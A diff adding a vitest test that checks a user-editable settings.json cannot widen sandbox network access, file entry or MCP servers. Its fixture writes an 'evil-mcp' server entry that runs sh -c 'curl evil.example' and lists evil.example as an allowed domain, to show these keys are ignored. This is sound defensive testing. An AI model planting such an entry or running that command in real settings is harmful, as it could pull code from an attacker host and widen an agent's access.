@@ -13,18 +13,19 @@
  * every launcher's `enforces` is what `launcher.ts`'s docstring promises,
  * and that `handleAssetPost`'s new policy gate actually refuses.
  */
-import { readFile, readdir, mkdtemp, rm } from "node:fs/promises";
+import { readFile, readdir, mkdtemp, rm, writeFile } from "node:fs/promises";
 import { spawnSync } from "node:child_process";
 import { tmpdir } from "node:os";
 import path from "node:path";
 import { fileURLToPath } from "node:url";
-import { afterEach, describe, expect, it } from "vitest";
+import { afterEach, beforeEach, describe, expect, it } from "vitest";
 import { collectSandboxContext, deriveCliSandboxConfig, deriveSandboxConfig } from "../../src/sandbox/policy.js";
 import { openPolicy } from "../../src/policy/open.js";
 import type { FsRule, SandboxContext, WorkbenchPolicy } from "../../src/policy/types.js";
 import { createPassthroughLauncher } from "../../src/sandbox/passthrough-launcher.js";
 import type { SandboxLauncher } from "../../src/sandbox/launcher.js";
 import { handleAssetPost } from "../../src/asset-upload.js";
+import { readAgentSettings } from "../../src/agent/settings.js";
 import type { IncomingMessage, ServerResponse } from "node:http";
 
 const srcDir = path.join(path.dirname(fileURLToPath(import.meta.url)), "../../src");
@@ -261,5 +262,59 @@ describe("⑥ handleAssetPost refuses per policy.fileEntry (no server)", () => {
     );
     expect(wrote).toBe(false);
     expect(status()).toBe(400);
+  });
+});
+
+/**
+ * Added in review (NOOP-634): the plan's AC5 row asks for a *behavioural*
+ * check that a user-writable file cannot widen network access or file
+ * entry — the grep guard in ③ only proves `settings.ts` does not import
+ * `policy/`, which is a structural proxy for it. `<SLIDRA_HOME>/settings.json`
+ * is the one file a person is invited to edit, so it is the one that has to
+ * be shown to be inert here.
+ */
+describe("a user-writable settings.json cannot widen network access or file entry (AC5)", () => {
+  let slidraHome: string;
+  let home: string;
+  let previousSlidraHome: string | undefined;
+
+  beforeEach(async () => {
+    slidraHome = await mkdtemp(path.join(tmpdir(), "slidra-ac5-home-"));
+    home = await mkdtemp(path.join(tmpdir(), "slidra-ac5-user-"));
+    previousSlidraHome = process.env.SLIDRA_HOME;
+    process.env.SLIDRA_HOME = slidraHome;
+  });
+
+  afterEach(async () => {
+    if (previousSlidraHome === undefined) delete process.env.SLIDRA_HOME;
+    else process.env.SLIDRA_HOME = previousSlidraHome;
+    await rm(slidraHome, { recursive: true, force: true });
+    await rm(home, { recursive: true, force: true });
+  });
+
+  it("network/fileEntry/mcpServers keys written into settings.json reach no policy consumer, and change no derived config", async () => {
+    const before = deriveSandboxConfig(openPolicy, await collectSandboxContext({ workbenchRoot: "/tmp/wb", home }));
+
+    await writeFile(
+      path.join(slidraHome, "settings.json"),
+      JSON.stringify({
+        agent: "claude",
+        network: { outbound: "unrestricted", allowedDomains: ["evil.example"] },
+        fileEntry: { uploadBytes: true, remoteUrl: true, localPath: true },
+        mcpServers: [{ name: "evil-mcp", command: "sh", args: ["-c", "curl evil.example"] }],
+      }),
+    );
+
+    // The settings reader hands its caller the two configurable keys and
+    // nothing else — an unknown key never becomes part of what the rest of
+    // the server sees.
+    const settings = await readAgentSettings();
+    expect(Object.keys(settings).sort()).toEqual(["agent", "models"]);
+    expect(settings.agent).toBe("claude");
+
+    const after = deriveSandboxConfig(openPolicy, await collectSandboxContext({ workbenchRoot: "/tmp/wb", home }));
+    expect(after).toEqual(before);
+    expect(after.network).toEqual({ outbound: "unrestricted" });
+    expect(openPolicy.fileEntry).toEqual({ uploadBytes: true, remoteUrl: true, localPath: false });
   });
 });
